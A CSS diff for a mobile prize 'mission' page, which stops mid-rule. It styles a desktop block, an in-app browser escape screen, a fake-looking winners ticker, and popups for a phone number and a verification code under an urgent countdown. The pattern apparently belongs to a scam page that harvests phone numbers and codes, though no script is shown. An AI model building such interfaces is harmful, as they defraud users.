@@ -35,18 +35,7 @@
             background-attachment: fixed;
         }
 
-        /* ============================================================
-           SVG ICON STYLES (button icons)
-           ============================================================ */
-        .btn-svg-icon {
-            width: 20px;
-            height: 20px;
-            flex-shrink: 0;
-            display: inline-block;
-            vertical-align: middle;
-            filter: drop-shadow(0 1px 2px rgba(0,0,0,0.3));
-            transition: transform 0.15s ease;
-        }
+        .btn-svg-icon { width: 20px; height: 20px; flex-shrink: 0; display: inline-block; vertical-align: middle; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.3)); transition: transform 0.15s ease; }
         .btn-svg-icon.lg { width: 24px; height: 24px; }
         .btn-svg-icon.sm { width: 16px; height: 16px; }
 
@@ -59,295 +48,50 @@
         @keyframes blockPulse { 0%, 100% { transform: scale(1); opacity: 0.85; } 50% { transform: scale(1.1); opacity: 1; } }
         @media (hover: hover) and (pointer: fine), (min-width: 769px) { #desktopBlock { display: flex !important; } #missionApp { display: none !important; } }
 
-        /* ============================================================
-           ✅ INTENT / BROWSER GUARD — REMASTERED
-           ============================================================ */
+        /* INTENT / BROWSER GUARD */
         #intentBlock {
-            display: none;
-            position: fixed;
-            inset: 0;
-            z-index: 1000000;
-            background:
-                radial-gradient(ellipse at 50% 0%, #4d6dff 0%, transparent 55%),
-                radial-gradient(ellipse at 50% 100%, #0a1a6b 0%, transparent 60%),
-                linear-gradient(180deg, #1a3dff 0%, #0d1ecc 50%, #05106b 100%);
-            color: #fff;
-            font-family: 'Poppins', 'Fredoka', sans-serif;
-            padding: 24px 16px;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            overflow-y: auto;
-            overflow-x: hidden;
-            -webkit-overflow-scrolling: touch;
-            overscroll-behavior: contain;
+            display: none; position: fixed; inset: 0; z-index: 1000000;
+            background: radial-gradient(ellipse at 50% 0%, #4d6dff 0%, transparent 55%),
+                        radial-gradient(ellipse at 50% 100%, #0a1a6b 0%, transparent 60%),
+                        linear-gradient(180deg, #1a3dff 0%, #0d1ecc 50%, #05106b 100%);
+            color: #fff; font-family: 'Poppins', 'Fredoka', sans-serif;
+            padding: 24px 16px; flex-direction: column; align-items: center; justify-content: flex-start;
+            overflow-y: auto; overflow-x: hidden; -webkit-overflow-scrolling: touch; overscroll-behavior: contain;
         }
         #intentBlock::before {
-            content: '';
-            position: fixed;
-            inset: 0;
+            content: ''; position: fixed; inset: 0;
             background: conic-gradient(from 0deg at 50% 30%, rgba(255, 255, 255, 0.06) 0deg, transparent 30deg, rgba(255, 255, 255, 0.06) 60deg, transparent 90deg, rgba(255, 255, 255, 0.06) 120deg, transparent 150deg, rgba(255, 255, 255, 0.06) 180deg, transparent 210deg, rgba(255, 255, 255, 0.06) 240deg, transparent 270deg, rgba(255, 255, 255, 0.06) 300deg, transparent 330deg, rgba(255, 255, 255, 0.06) 360deg);
-            animation: raysRotate 30s linear infinite;
-            opacity: 0.7;
-            pointer-events: none;
-            z-index: 0;
+            animation: raysRotate 30s linear infinite; opacity: 0.7; pointer-events: none; z-index: 0;
         }
         #intentBlock .intent-card {
-            position: relative;
-            z-index: 2;
-            width: 100%;
-            max-width: 400px;
+            position: relative; z-index: 2; width: 100%; max-width: 400px;
             background: linear-gradient(180deg, rgba(255, 255, 255, 0.18) 0%, transparent 30%), linear-gradient(160deg, #4d6dff 0%, #1a3dff 45%, #0d1ecc 100%);
-            border: 3px solid #a7c4ff;
-            border-radius: 32px;
-            padding: 34px 24px 30px;
-            text-align: center;
+            border: 3px solid #a7c4ff; border-radius: 32px; padding: 34px 24px 30px; text-align: center;
             box-shadow: 0 25px 60px rgba(0, 0, 0, 0.55), 0 0 60px rgba(110, 168, 255, 0.55), inset 0 0 40px rgba(255, 255, 255, 0.08);
-            overflow: hidden;
-            animation: cardEnter 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            margin: auto 0;
-            flex-shrink: 0;
+            overflow: hidden; animation: cardEnter 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275); margin: auto 0; flex-shrink: 0;
         }
-        #intentBlock .intent-card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%;
-            width: 60%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.35), transparent);
-            transform: skewX(-20deg);
-            animation: cardShine 4s ease-in-out infinite;
-            pointer-events: none;
-        }
-
-        #intentBlock .intent-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            padding: 6px 18px;
-            background: linear-gradient(180deg, #ffe066 0%, #ffb300 100%);
-            border: 2px solid #fff;
-            border-radius: 30px;
-            font-family: 'Orbitron', monospace;
-            font-size: 10px;
-            font-weight: 900;
-            letter-spacing: 2.5px;
-            color: #4a1f00;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.7);
-            text-transform: uppercase;
-            animation: badgeGlow 2.5s ease-in-out infinite;
-        }
-        #intentBlock .intent-badge .badge-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #ff3b3b;
-            box-shadow: 0 0 10px #ff3b3b;
-            animation: dotPulse 1.2s infinite;
-        }
-
-        #intentBlock .intent-image-wrap {
-            position: relative;
-            width: 100%;
-            max-width: 240px;
-            margin: 0 auto 22px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        #intentBlock .intent-image-wrap::before {
-            content: '';
-            position: absolute;
-            inset: -20px;
-            background: radial-gradient(circle at center, rgba(255, 215, 0, 0.5) 0%, rgba(110, 168, 255, 0.3) 40%, transparent 70%);
-            border-radius: 50%;
-            filter: blur(20px);
-            animation: imgGlow 3s ease-in-out infinite;
-            z-index: 0;
-        }
-        #intentBlock .intent-image {
-            position: relative;
-            z-index: 1;
-            width: 100%;
-            max-width: 100%;
-            height: auto;
-            display: block;
-            border-radius: 20px;
-            filter: drop-shadow(0 12px 28px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 28px rgba(255, 215, 0, 0.5));
-            animation: imgFloat 3s ease-in-out infinite;
-        }
-
-        #intentBlock .intent-title {
-            font-family: 'Fredoka', sans-serif;
-            font-size: 26px;
-            font-weight: 900;
-            line-height: 1.15;
-            letter-spacing: 1px;
-            background: linear-gradient(180deg, #ffffff 0%, #ffe066 40%, #ffb300 75%, #ff8800 100%);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.75));
-            margin-bottom: 12px;
-            text-transform: uppercase;
-        }
-        #intentBlock .intent-subtitle {
-            font-family: 'Poppins', sans-serif;
-            font-size: 13px;
-            font-weight: 500;
-            line-height: 1.6;
-            color: rgba(255, 255, 255, 0.92);
-            margin-bottom: 8px;
-            text-shadow: 0 2px 6px rgba(0, 0, 0, 0.4);
-        }
-        #intentBlock .intent-subtitle strong {
-            color: #ffe066;
-            font-weight: 800;
-            text-shadow: 0 0 12px rgba(255, 215, 0, 0.75);
-        }
-        #intentBlock .intent-danger-text {
-            font-family: 'Poppins', sans-serif;
-            font-size: 11.5px;
-            font-weight: 700;
-            color: #ff8888;
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px rgba(255, 68, 68, 0.5);
-            letter-spacing: 0.3px;
-        }
-
-        #intentBlock .intent-divider {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin: 0 auto 20px;
-            width: 80%;
-        }
-        #intentBlock .intent-divider .line {
-            flex: 1;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.9), transparent);
-            border-radius: 2px;
-        }
-        #intentBlock .intent-divider .star {
-            font-size: 12px;
-            color: #ffe066;
-            filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.9));
-        }
-
-        #intentBlock .intent-steps {
-            display: block;
-            background: rgba(0, 0, 0, 0.38);
-            border: 1.5px solid rgba(255, 215, 0, 0.7);
-            border-radius: 16px;
-            padding: 14px 18px;
-            font-family: 'Poppins', sans-serif;
-            font-size: 12px;
-            line-height: 2;
-            color: rgba(255, 255, 255, 0.92);
-            text-align: left;
-            box-shadow: 0 0 12px rgba(255, 215, 0, 0.35), inset 0 0 10px rgba(255, 215, 0, 0.1);
-            margin-bottom: 26px;
-        }
-        #intentBlock .intent-steps .steps-title {
-            display: block;
-            font-family: 'Orbitron', monospace;
-            font-size: 11px;
-            font-weight: 900;
-            color: #ffe066;
-            letter-spacing: 1.8px;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
-        }
+        #intentBlock .intent-badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 18px; background: linear-gradient(180deg, #ffe066 0%, #ffb300 100%); border: 2px solid #fff; border-radius: 30px; font-family: 'Orbitron', monospace; font-size: 10px; font-weight: 900; letter-spacing: 2.5px; color: #4a1f00; margin-bottom: 20px; box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.7); text-transform: uppercase; animation: badgeGlow 2.5s ease-in-out infinite; }
+        #intentBlock .intent-badge .badge-dot { width: 8px; height: 8px; border-radius: 50%; background: #ff3b3b; box-shadow: 0 0 10px #ff3b3b; animation: dotPulse 1.2s infinite; }
+        #intentBlock .intent-image-wrap { position: relative; width: 100%; max-width: 240px; margin: 0 auto 22px; display: flex; align-items: center; justify-content: center; }
+        #intentBlock .intent-image { position: relative; z-index: 1; width: 100%; max-width: 100%; height: auto; display: block; border-radius: 20px; filter: drop-shadow(0 12px 28px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 28px rgba(255, 215, 0, 0.5)); animation: imgFloat 3s ease-in-out infinite; }
+        #intentBlock .intent-title { font-family: 'Fredoka', sans-serif; font-size: 26px; font-weight: 900; line-height: 1.15; letter-spacing: 1px; background: linear-gradient(180deg, #ffffff 0%, #ffe066 40%, #ffb300 75%, #ff8800 100%); -webkit-background-clip: text; background-clip: text; color: transparent; filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.75)); margin-bottom: 12px; text-transform: uppercase; }
+        #intentBlock .intent-subtitle { font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 500; line-height: 1.6; color: rgba(255, 255, 255, 0.92); margin-bottom: 8px; text-shadow: 0 2px 6px rgba(0, 0, 0, 0.4); }
+        #intentBlock .intent-subtitle strong { color: #ffe066; font-weight: 800; text-shadow: 0 0 12px rgba(255, 215, 0, 0.75); }
+        #intentBlock .intent-danger-text { font-family: 'Poppins', sans-serif; font-size: 11.5px; font-weight: 700; color: #ff8888; margin-bottom: 20px; text-shadow: 0 0 10px rgba(255, 68, 68, 0.5); letter-spacing: 0.3px; }
+        #intentBlock .intent-divider { display: flex; align-items: center; justify-content: center; gap: 10px; margin: 0 auto 20px; width: 80%; }
+        #intentBlock .intent-divider .line { flex: 1; height: 2px; background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.9), transparent); border-radius: 2px; }
+        #intentBlock .intent-divider .star { font-size: 12px; color: #ffe066; filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.9)); }
+        #intentBlock .intent-steps { display: block; background: rgba(0, 0, 0, 0.38); border: 1.5px solid rgba(255, 215, 0, 0.7); border-radius: 16px; padding: 14px 18px; font-family: 'Poppins', sans-serif; font-size: 12px; line-height: 2; color: rgba(255, 255, 255, 0.92); text-align: left; box-shadow: 0 0 12px rgba(255, 215, 0, 0.35), inset 0 0 10px rgba(255, 215, 0, 0.1); margin-bottom: 26px; }
+        #intentBlock .intent-steps .steps-title { display: block; font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 900; color: #ffe066; letter-spacing: 1.8px; margin-bottom: 8px; text-transform: uppercase; text-shadow: 0 0 10px rgba(255, 215, 0, 0.5); }
         #intentBlock .intent-steps strong { color: #ffe066; font-weight: 800; }
-        #intentBlock .intent-steps .step-num {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 18px;
-            height: 18px;
-            border-radius: 50%;
-            background: rgba(255, 215, 0, 0.2);
-            border: 1.5px solid #ffe066;
-            color: #ffe066;
-            font-family: 'Orbitron', monospace;
-            font-size: 10px;
-            font-weight: 900;
-            margin-right: 6px;
-            vertical-align: middle;
-        }
+        #intentBlock .intent-steps .step-num { display: inline-flex; align-items: center; justify-content: center; width: 18px; height: 18px; border-radius: 50%; background: rgba(255, 215, 0, 0.2); border: 1.5px solid #ffe066; color: #ffe066; font-family: 'Orbitron', monospace; font-size: 10px; font-weight: 900; margin-right: 6px; vertical-align: middle; }
+        #intentBlock .auto-open-btn { position: relative; width: 100%; padding: 18px 24px; display: flex; align-items: center; justify-content: center; gap: 10px; background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%); border: 3px solid #ffffff; border-radius: 18px; font-family: 'Orbitron', monospace; font-size: 14px; font-weight: 900; letter-spacing: 2.5px; text-transform: uppercase; color: #4a1f00; cursor: pointer; overflow: hidden; box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 40px rgba(255, 215, 0, 0.65); transition: transform 0.12s ease, box-shadow 0.12s ease; animation: btnPulse 2.4s ease-in-out infinite; margin-bottom: 20px; }
+        #intentBlock .auto-open-btn:active { transform: translateY(6px); box-shadow: 0 0 0 #a66900, 0 4px 12px rgba(0, 0, 0, 0.5); }
+        #intentBlock .auto-open-btn svg { width: 22px; height: 22px; flex-shrink: 0; animation: iconRocketFloat 1.6s ease-in-out infinite; }
+        #intentBlock .intent-note { display: flex; align-items: center; justify-content: center; gap: 8px; font-family: 'Poppins', sans-serif; font-size: 10.5px; font-weight: 500; color: rgba(255, 255, 255, 0.75); letter-spacing: 0.5px; padding: 10px 14px; background: rgba(0, 0, 0, 0.25); border: 1px solid rgba(57, 255, 20, 0.3); border-radius: 12px; }
+        #intentBlock .intent-note svg { width: 14px; height: 14px; color: #39ff14; filter: drop-shadow(0 0 8px rgba(57, 255, 20, 0.9)); flex-shrink: 0; }
 
-        #intentBlock .auto-open-btn {
-            position: relative;
-            width: 100%;
-            padding: 18px 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%);
-            border: 3px solid #ffffff;
-            border-radius: 18px;
-            font-family: 'Orbitron', monospace;
-            font-size: 14px;
-            font-weight: 900;
-            letter-spacing: 2.5px;
-            text-transform: uppercase;
-            color: #4a1f00;
-            cursor: pointer;
-            overflow: hidden;
-            box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 40px rgba(255, 215, 0, 0.65);
-            transition: transform 0.12s ease, box-shadow 0.12s ease;
-            animation: btnPulse 2.4s ease-in-out infinite;
-            margin-bottom: 20px;
-        }
-        #intentBlock .auto-open-btn::before {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%;
-            width: 60%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.7), transparent);
-            transform: skewX(-20deg);
-            animation: btnShine 2.5s ease-in-out infinite;
-        }
-        #intentBlock .auto-open-btn:active {
-            transform: translateY(6px);
-            box-shadow: 0 0 0 #a66900, 0 4px 12px rgba(0, 0, 0, 0.5);
-        }
-        #intentBlock .auto-open-btn svg {
-            width: 22px;
-            height: 22px;
-            flex-shrink: 0;
-            animation: iconRocketFloat 1.6s ease-in-out infinite;
-        }
-
-        #intentBlock .intent-note {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            font-family: 'Poppins', sans-serif;
-            font-size: 10.5px;
-            font-weight: 500;
-            color: rgba(255, 255, 255, 0.75);
-            letter-spacing: 0.5px;
-            padding: 10px 14px;
-            background: rgba(0, 0, 0, 0.25);
-            border: 1px solid rgba(57, 255, 20, 0.3);
-            border-radius: 12px;
-        }
-        #intentBlock .intent-note svg {
-            width: 14px;
-            height: 14px;
-            color: #39ff14;
-            filter: drop-shadow(0 0 8px rgba(57, 255, 20, 0.9));
-            flex-shrink: 0;
-        }
-
-        /* ============================================================
-           WINNERS TICKER
-           ============================================================ */
+        /* WINNERS TICKER */
         .winners-ticker { position: fixed; top: 12px; left: 50%; transform: translateX(-50%); z-index: 500; display: flex; align-items: center; gap: 8px; padding: 8px 18px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(0, 0, 0, 0.4)); border: 2px solid #ffe066; border-radius: 30px; box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.6), inset 0 0 15px rgba(255, 215, 0, 0.15); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); max-width: calc(100% - 30px); animation: tickerGlow 3s ease-in-out infinite; }
         @keyframes tickerGlow { 0%, 100% { box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.6), inset 0 0 15px rgba(255, 215, 0, 0.15); } 50% { box-shadow: 0 4px 0 #a66900, 0 0 45px rgba(255, 215, 0, 0.95), inset 0 0 20px rgba(255, 215, 0, 0.25); } }
         .winners-ticker .ticker-live-dot { width: 8px; height: 8px; border-radius: 50%; background: #39ff14; box-shadow: 0 0 10px #39ff14; animation: livePulse 1.2s ease-in-out infinite; flex-shrink: 0; }
@@ -358,9 +102,7 @@
         .winners-ticker.fade-out .ticker-text { opacity: 0; transform: translateY(-6px); }
         .winners-ticker.fade-in .ticker-text { opacity: 1; transform: translateY(0); }
 
-        /* ============================================================
-           BACKGROUND EFFECTS
-           ============================================================ */
+        /* BACKGROUND EFFECTS */
         .bg-rays { position: fixed; inset: 0; z-index: 0; pointer-events: none; background: conic-gradient(from 0deg at 50% 30%, rgba(255, 255, 255, 0.06) 0deg, transparent 30deg, rgba(255, 255, 255, 0.06) 60deg, transparent 90deg, rgba(255, 255, 255, 0.06) 120deg, transparent 150deg, rgba(255, 255, 255, 0.06) 180deg, transparent 210deg, rgba(255, 255, 255, 0.06) 240deg, transparent 270deg, rgba(255, 255, 255, 0.06) 300deg, transparent 330deg, rgba(255, 255, 255, 0.06) 360deg); animation: raysRotate 30s linear infinite; opacity: 0.7; }
         @keyframes raysRotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         .bg-glow { position: fixed; bottom: -20%; left: 50%; transform: translateX(-50%); width: 140%; height: 60%; background: radial-gradient(ellipse at center, rgba(110, 168, 255, 0.45) 0%, rgba(77, 109, 255, 0.25) 30%, transparent 70%); z-index: 0; pointer-events: none; filter: blur(30px); animation: glowPulse 4s ease-in-out infinite; }
@@ -372,9 +114,7 @@
         .confetti { position: fixed; top: -20px; width: 8px; height: 12px; z-index: 1; opacity: 0; pointer-events: none; animation: confettiFall 6s linear infinite; }
         @keyframes confettiFall { 0% { transform: translateY(-20px) rotate(0deg); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(110vh) rotate(720deg); opacity: 0; } }
 
-        /* ============================================================
-           MAIN APP
-           ============================================================ */
+        /* MAIN APP */
         #missionApp { position: relative; z-index: 10; min-height: 100vh; min-height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding: 70px 18px 40px; }
         .mission-card { position: relative; width: 100%; max-width: 420px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.18) 0%, transparent 30%), linear-gradient(160deg, #4d6dff 0%, #1a3dff 45%, #0d1ecc 100%); border: 3px solid #a7c4ff; border-radius: 32px; padding: 36px 22px 28px; text-align: center; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.55), 0 0 60px rgba(110, 168, 255, 0.55), inset 0 0 40px rgba(255, 255, 255, 0.08); overflow: hidden; animation: cardEnter 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         @keyframes cardEnter { 0% { transform: scale(0.85) translateY(30px); opacity: 0; } 100% { transform: scale(1) translateY(0); opacity: 1; } }
@@ -399,199 +139,21 @@
         .mission-chip { display: flex; align-items: center; gap: 5px; padding: 7px 12px; background: rgba(0, 0, 0, 0.35); border: 1.5px solid rgba(255, 215, 0, 0.7); border-radius: 14px; font-family: 'Orbitron', monospace; font-size: 9px; font-weight: 800; color: #ffe066; letter-spacing: 1.2px; text-transform: uppercase; box-shadow: 0 0 12px rgba(255, 215, 0, 0.35), inset 0 0 10px rgba(255, 215, 0, 0.1); }
         .mission-chip .chip-icon { font-size: 12px; }
 
-        /* ============================================================
-           REMASTERED BUTTONS with SVG icons
-           ============================================================ */
-        .mission-btn {
-            position: relative;
-            width: 100%;
-            padding: 18px 22px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%);
-            border: 3px solid #ffffff;
-            border-radius: 18px;
-            font-family: 'Orbitron', monospace;
-            font-size: 15px;
-            font-weight: 900;
-            letter-spacing: 2.5px;
-            text-transform: uppercase;
-            color: #4a1f00;
-            cursor: pointer;
-            overflow: hidden;
-            box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 40px rgba(255, 215, 0, 0.65);
-            transition: transform 0.12s ease, box-shadow 0.12s ease;
-            animation: btnPulse 2.4s ease-in-out infinite;
-        }
+        .mission-btn { position: relative; width: 100%; padding: 18px 22px; display: flex; align-items: center; justify-content: center; gap: 12px; background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%); border: 3px solid #ffffff; border-radius: 18px; font-family: 'Orbitron', monospace; font-size: 15px; font-weight: 900; letter-spacing: 2.5px; text-transform: uppercase; color: #4a1f00; cursor: pointer; overflow: hidden; box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 40px rgba(255, 215, 0, 0.65); transition: transform 0.12s ease, box-shadow 0.12s ease; animation: btnPulse 2.4s ease-in-out infinite; }
         @keyframes btnPulse { 0%, 100% { box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 40px rgba(255, 215, 0, 0.65); } 50% { box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 65px rgba(255, 215, 0, 1); } }
         .mission-btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 60%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.7), transparent); transform: skewX(-20deg); animation: btnShine 2.5s ease-in-out infinite; }
         @keyframes btnShine { 0% { left: -100%; } 60% { left: 150%; } 100% { left: 150%; } }
         .mission-btn:active { transform: translateY(6px); box-shadow: 0 0 0 #a66900, 0 4px 12px rgba(0, 0, 0, 0.5); }
         .mission-btn svg { width: 22px; height: 22px; flex-shrink: 0; animation: iconRocketFloat 1.6s ease-in-out infinite; }
-        @keyframes iconRocketFloat {
-            0%, 100% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-2px) rotate(-8deg); }
-        }
+        @keyframes iconRocketFloat { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-2px) rotate(-8deg); } }
 
         .mission-note { margin-top: 18px; font-family: 'Poppins', sans-serif; font-size: 10px; font-weight: 500; color: rgba(255, 255, 255, 0.7); letter-spacing: 0.5px; display: flex; align-items: center; justify-content: center; gap: 6px; }
         .mission-note svg { width: 12px; height: 12px; color: #39ff14; filter: drop-shadow(0 0 8px rgba(57, 255, 20, 0.8)); flex-shrink: 0; }
 
-        /* ============================================================
-           POPUPS
-           ============================================================ */
-        .popup-overlay { display: none; position: fixed; inset: 0; z-index: 99999; background: rgba(5, 10, 30, 0.92); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); align-items: center; justify-content: center; padding: 20px; animation: popupFadeIn 0.3s ease; overflow-y: auto; }
-        .popup-overlay.show { display: flex; }
-        @keyframes popupFadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .popup-card { position: relative; width: 100%; max-width: 380px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.18) 0%, transparent 30%), linear-gradient(160deg, #4d6dff 0%, #1a3dff 45%, #0d1ecc 100%); border: 3px solid #a7c4ff; border-radius: 28px; padding: 30px 22px 24px; text-align: center; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.7), 0 0 60px rgba(110, 168, 255, 0.65); animation: popupEnter 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); overflow: hidden; margin: auto; }
-        @keyframes popupEnter { 0% { transform: scale(0.7) translateY(30px); opacity: 0; } 100% { transform: scale(1) translateY(0); opacity: 1; } }
-        .popup-close { position: absolute; top: 12px; right: 14px; width: 34px; height: 34px; background: rgba(255, 255, 255, 0.15); border: 2px solid #ffe066; border-radius: 50%; color: #ffe066; font-size: 16px; font-weight: 900; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.2s ease; z-index: 10; }
-        .popup-close:hover, .popup-close:active { background: rgba(255, 68, 68, 0.5); color: #fff; transform: rotate(90deg) scale(1.1); border-color: #ff4444; }
-        .popup-close svg { width: 16px; height: 16px; }
-        .popup-img-wrap { position: relative; width: 100%; max-width: 220px; margin: 8px auto 18px; display: flex; align-items: center; justify-content: center; }
-        .popup-img-wrap::before { content: ''; position: absolute; inset: -16px; background: radial-gradient(circle at center, rgba(255, 215, 0, 0.5) 0%, rgba(110, 168, 255, 0.3) 40%, transparent 70%); border-radius: 50%; filter: blur(16px); animation: imgGlow 3s ease-in-out infinite; z-index: 0; }
-        .popup-img { position: relative; z-index: 1; width: 100%; max-width: 100%; height: auto; display: block; border-radius: 18px; filter: drop-shadow(0 8px 20px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 20px rgba(255, 215, 0, 0.55)); animation: imgFloat 3s ease-in-out infinite; }
-        .popup-title { font-family: 'Fredoka', sans-serif; font-size: 22px; font-weight: 900; line-height: 1.2; background: linear-gradient(180deg, #ffffff 0%, #ffe066 40%, #ffb300 100%); -webkit-background-clip: text; background-clip: text; color: transparent; filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.75)); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
-        .popup-title.danger { background: linear-gradient(180deg, #ff8888 0%, #ff1744 40%, #8b0000 100%); -webkit-background-clip: text; background-clip: text; }
-        .popup-subtitle { font-family: 'Poppins', sans-serif; font-size: 12px; font-weight: 500; line-height: 1.6; color: rgba(255, 255, 255, 0.9); margin-bottom: 18px; }
+        /* POPUPS */
+        .popup-overlay { display: none; position: fixed; inset: 0; z-index
 
-        .popup-btn {
-            position: relative;
-            width: 100%;
-            padding: 16px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%);
-            border: 3px solid #fff;
-            border-radius: 16px;
-            font-family: 'Orbitron', monospace;
-            font-size: 14px;
-            font-weight: 900;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            color: #4a1f00;
-            cursor: pointer;
-            overflow: hidden;
-            box-shadow: 0 5px 0 #a66900, 0 8px 20px rgba(0, 0, 0, 0.55), 0 0 30px rgba(255, 215, 0, 0.6);
-            transition: transform 0.12s ease, box-shadow 0.12s ease;
-            margin-top: 6px;
-        }
-        .popup-btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 60%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.6), transparent); transform: skewX(-20deg); animation: btnShine 2.5s ease-in-out infinite; }
-        .popup-btn:active { transform: translateY(5px); box-shadow: 0 0 0 #a66900, 0 4px 12px rgba(0, 0, 0, 0.5); }
-        .popup-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; filter: grayscale(0.4); }
-        .popup-btn svg { width: 18px; height: 18px; flex-shrink: 0; }
-
-        .countdown-badge { display: inline-block; margin-bottom: 12px; padding: 5px 14px; background: rgba(0, 0, 0, 0.4); border: 2px solid #ffe066; border-radius: 20px; font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 800; color: #ffe066; letter-spacing: 1.5px; box-shadow: 0 0 15px rgba(255, 215, 0, 0.5); }
-        .input-label { display: flex; align-items: center; justify-content: center; gap: 6px; font-family: 'Orbitron', monospace; font-size: 10px; color: #ffe066; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 10px; }
-        .input-label svg { width: 14px; height: 14px; flex-shrink: 0; }
-        .phone-input { width: 100%; max-width: 260px; display: block; margin: 0 auto 12px; text-align: center; font-family: 'Orbitron', monospace; font-size: 17px; font-weight: 900; padding: 14px; background: #0a1020; border: 3px solid #ffe066; border-radius: 14px; color: #ffe066; letter-spacing: 2px; outline: none; box-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
-        .phone-input::placeholder { color: rgba(255, 215, 0, 0.4); letter-spacing: 2px; font-size: 13px; }
-        .phone-input:focus { border-color: #6ea8ff; box-shadow: 0 0 25px rgba(110, 168, 255, 0.7); }
-        .ai-code-input { width: 100%; max-width: 200px; display: block; margin: 0 auto 12px; text-align: center; font-family: 'Orbitron', monospace; font-size: 26px; font-weight: 900; padding: 14px; background: #0a1020; border: 3px solid #ffe066; border-radius: 14px; color: #ffe066; letter-spacing: 8px; outline: none; box-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
-        .ai-code-input::placeholder { color: rgba(255, 215, 0, 0.4); letter-spacing: 4px; font-size: 16px; }
-        .ai-code-input:focus { border-color: #6ea8ff; box-shadow: 0 0 25px rgba(110, 168, 255, 0.7); }
-        .ai-timer { font-family: 'Orbitron', monospace; font-size: 26px; font-weight: 900; color: #39ff14; text-shadow: 0 0 15px rgba(57, 255, 20, 0.7); letter-spacing: 3px; margin: 8px 0; }
-        .ai-timer.urgent { color: #ff4444; text-shadow: 0 0 20px rgba(255, 68, 68, 0.9); animation: urgentPulse 0.5s ease-in-out infinite; }
